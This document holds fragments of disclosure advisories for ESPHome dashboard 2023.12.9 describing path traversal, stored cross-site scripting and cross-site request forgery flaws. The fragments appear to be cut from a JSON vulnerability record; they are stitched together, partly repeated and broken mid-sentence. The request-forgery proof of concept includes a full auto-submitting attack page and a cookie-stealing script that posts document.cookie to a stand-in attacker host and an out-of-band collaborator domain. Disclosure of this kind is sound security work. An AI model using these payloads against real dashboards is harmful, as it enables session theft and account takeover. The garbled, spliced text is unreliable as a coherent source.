Summary\nSecurity misconfiguration in edit configuration file API in dashboard component of ESPHome version 2023.12.9 (command line installation) allows authenticated remote attackers to read and write arbitrary files under the configuration directory rendering remote code execution possible.\n\n### Details\nIt is possible to abuse this path traversal vulnerability both in command line installation and Home Assistant add-on, but it is possible to read and write files only under the configuration directory. \n\nThe vulnerability is present and exploitable in the command line installation, but it was not possible to confirm an impact in the home assistant add-on version.\n\n### PoC\n<img width=\"482\" alt=\"/edit?configuration=/config/.esphome/esphome.json\"

gives read and write access to files under the configuration directory and allows malicious users to write arbitrary code in python scripts executed during the compilation and flashing of firmwares for ESP boards. \n\nIf chained with GHSA-9p43-hj5j-96h5 and GHSA-5925-88xh-6h99, this issue could allow an unauthenticated remote user to gain remote code execution on the machine hosting the dashboard.\n\nIt also allows accessing sensitive information such as esphome.json and board firmware source code allowing a user to modify the board firmware, and leaking secrets such as: WiFi network credentials, fallback hotspot WiFi credentials, OTA component authentication password and API encryption key.\n\n### Credits\nSpike Reply Cybersecurity

Summary\nEdit configuration file API in dashboard component of ESPHome version 2023.12.9 (command line installation and Home Assistant add-on) serves unsanitized data with “Content-Type: text/html; charset=UTF-8”, allowing remote authenticated user to inject arbitrary web script and exfiltrate session cookies via Cross-Site scripting (XSS).\n\n### Credits\nSpike Reply Cybersecurity Teams\n\n### Details\nIt is possible for a malicious authenticated user to inject arbitrary Javascript in configuration files using a POST request to the /edit endpoint, the configuration parameter allows to specify the file to write. \n\nTo trigger the XSS vulnerability, the victim must visit the page /edit?configuration=[xss file].\n\n### PoC\n\nTo reproduce the issue, it is possible to perform a POST request to inject the payload:\n\nrequest:\nPOST /edit?configuration=xss.yaml HTTP/1.1\nHost: localhost:6052\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101

addition to this, cookies are not correctly secured, allowing the exfiltration of session cookie values.\n\n### Credits\nSpike Reply Cybersecurity

Summary\nAPI endpoints in dashboard component of ESPHome version 2023.12.9 (command line installation) are vulnerable to Cross-Site Request Forgery (CSRF) allowing remote attackers to carry out attacks against a logged user of the dashboard to perform operations on configuration files (create, edit, delete).\n\n### Details\nIt is possible for a malicious actor to create a specifically crafted web page that triggers a cross site request against ESPHome, this allows bypassing the authentication for API calls on the platform.\n\n### PoC\nAn example of malicious web page that abuses this vulnerability:\n\n\n<html>\n  <body>\n\t<form action=\"http://localhost:6052/edit?configuration=poc.yaml\" id=\"#main\" method=\"POST\" enctype=\"text/plain\" onsubmit=\"setTimeout(function () { window.location.reload(); }, 10)\">\n  \t<input type=\"hidden\" name=\"&lt;script&gt;&#13;&#10;fetch&#40;&apos;https&#58;&#47;&#47;907zv9yp9u3rjerkiakydpvcr3xulk99&#46;oastify&#46;com&#63;x\"

/>\n\t</form>\n\n\t<script>\n  \tdocument.forms[0].submit();\n\t</script>\n\n\t<script>\n\t</script>\n  </body>\n</html>\n\nIn which an attacker creates and weaponizes \"poc.yaml\" config file containing a cookie exfiltration script and forces the payload triggering visiting the vulnerable page.\n\n\nExample of such script:\n<script>\nfetch('https://attacker.domain', {\nmethod: 'POST',\nmode: 'no-cors',\nbody:document.cookie\n});\n</script>\n\n\n### Impact\nThis vulnerability allows bypassing authentication on API calls accessing configuration file operations on the behalf of a logged user. In order to trigger the vulnerability, the victim must visit a weaponized page.\n\nIn addition to this, it is possible to chain this vulnerability with GHSA-9p43-hj5j-96h5 (as seen in the PoC) to obtain a complete takeover of the user account.\n\n","fixed_in":["2024.3.0"],"id":"GHSA-5925-88xh-6h99","link":"https://osv.dev/vulnerability/GHSA-5925-88xh-6h99","source":"osv","summary":null,"withdrawn":null}]},"2023.2.0":{"info":{"author":"ESPHome","author_email":"esphome@nabucasa.com","bugtrack_url":null,"classifiers":["Environment

Summary\nAPI endpoints in dashboard component of ESPHome version 2023.12.9 (command line installation) are vulnerable to Cross-Site Request Forgery (CSRF) allowing remote attackers to carry out

crafted web page that triggers a cross site request against ESPHome, this allows bypassing the authentication for API calls on the platform.\n\n### PoC\nAn example of malicious web page that abuses this vulnerability:\n\n\n<html>\n  <body>\n\t<form action=\"http://localhost:6052/edit?configuration=poc.yaml\" id=\"#main\" method=\"POST\" enctype=\"text/plain\" onsubmit=\"setTimeout(function () {
